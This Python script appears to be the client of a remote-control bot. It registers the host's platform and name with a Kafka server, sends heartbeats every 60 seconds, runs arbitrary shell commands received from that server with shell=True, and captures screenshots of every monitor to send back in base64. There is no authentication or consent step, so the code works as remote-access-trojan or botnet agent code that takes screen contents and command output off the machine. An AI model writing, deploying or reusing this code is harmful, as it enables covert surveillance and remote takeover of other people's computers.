from io import BytesIO
import platform
import time
from kafka_producer import produce_message
from kafka_consumer import KafkaConsumerDaemon
import subprocess
import uuid
import schedule
from mss import mss
from PIL import Image, ImageGrab
import base64


"""This script is a Kafka consumer that listens for tasks, executes them, and produces callback messages with the results.
It also sends heartbeat messages to indicate that the bot is alive.
"""
def handle_callback(task, group_id):
    """ Handle the callback logic based on the consumed message. """
    print(f'Received order {task}')
    print(f'Received script execution order, proceeding to execute it')
    # Execute the task
    try:
        # Execute the script
        if task['actionType'] == 'exec_script':
            # For exec_script, use subprocess.run
            result_str = ""
            for command in task['parameters']['value'].split("\n"):
                result = subprocess.run(command, shell=True, check=True, text=True, capture_output=True)
                print(f'Script output: {result.stdout}')
                result_str += "\n" + result.stdout
        elif task['actionType'] == 'screenshot':
            # For creates an screenshot, use the system command and sends in base64 format
            result_str = shot_screenshot()
            print(f'Screenshot created successfully, size: {len(result_str)} bytes')
    except subprocess.CalledProcessError as e:
        print(f'Script execution failed: {e.stderr}')
        result = e.stderr
        
    # Produce a callback message
    callback_task = {
        'actionType': 'callback',
        'parameters': {
            'groupId': group_id,
            'taskId': task['id']
        },
        'result': result_str
    }
    produce_message(bootstrap_servers, 'callback', callback_task)

def shot_screenshot():
    """ Take a screenshot and return the image in base64 format. """
    try:
        with mss() as sct:
            # Capture all monitors
            monitor = sct.monitors[0]
            sct_img = ImageGrab.grab(all_screens=True)
            
            # Store the image transformed to base64
            # Save the image to a BytesIO object
            buffered = BytesIO()
            sct_img.save(buffered, format="PNG")

            # Encode the image to base64
            img_str = base64.b64encode(buffered.getvalue()).decode('utf-8')
            
        # Return the image object
        return img_str
    except Exception as e:
        print(f"Error taking screenshot: {e}")
        return str(e)

""" Produce a heartbeat message to the specified topic. """
def produce_heart_beat(bootstrap_servers, topic, bot_id):
    print(f"Heartbeat message produced to topic {topic}")
    heart_beat_task = {
        'actionType': 'heartbeat',
        'parameters': {
            'botId': bot_id
        },
        'result': "success"
    }
    produce_message(bootstrap_servers, "heartbeat", heart_beat_task)

def main(bootstrap_servers, topic):
    # Create and start the consumer daemon
    group_id = str(uuid.uuid4())
    consumer_daemon = KafkaConsumerDaemon(bootstrap_servers, topic, group_id, handle_callback)
    consumer_daemon.start()

    print(f"Kafka consumer opened successfully on topic {topic}")

    # Produce initial message with a unique group ID
    initial_task = {
        'id': '',
        'actionType': 'init',
        'parameters': {
            'groupId': group_id,
            'os': platform.platform(),
            'name': platform.node()
        },
        'result': "success"
    }
    produce_message(bootstrap_servers, "init", initial_task)
    print(f"Initial message produced to topic {topic} with group ID {group_id}")
    
    # Every 60 seconds we will send a heart beat message
    schedule.every(60).seconds.do(produce_heart_beat, bootstrap_servers, topic, group_id)
    print(f"Initialized scheduled heartbeat system for group ID {group_id}")

    try:
        # Keep the main thread alive
        while True:
            schedule.run_pending()
            time.sleep(1)  # Sleep for a short interval to prevent high CPU usage
            pass
    except KeyboardInterrupt:
        print("Stopping consumer...")
        consumer_daemon.stop()
        consumer_daemon.join()

def read_config_file(file_path):
    config = {}
    with open(file_path, 'r') as file:
        for line in file:
            line = line.strip()
            if line and not line.startswith('#'):  # Ignore comments and empty lines
                key, value = line.split('=', 1)
                config[key.strip()] = value.strip()
    return config

if __name__ == '__main__':
    # Read configuration from config.txt
    config = read_config_file('config.txt')
    
    if not config:
        print("Configuration file is empty or not found.")
        exit(1)

    bootstrap_servers = config.get('bootstrap_servers')
    topic = config.get('topic')

    main(bootstrap_servers, topic)
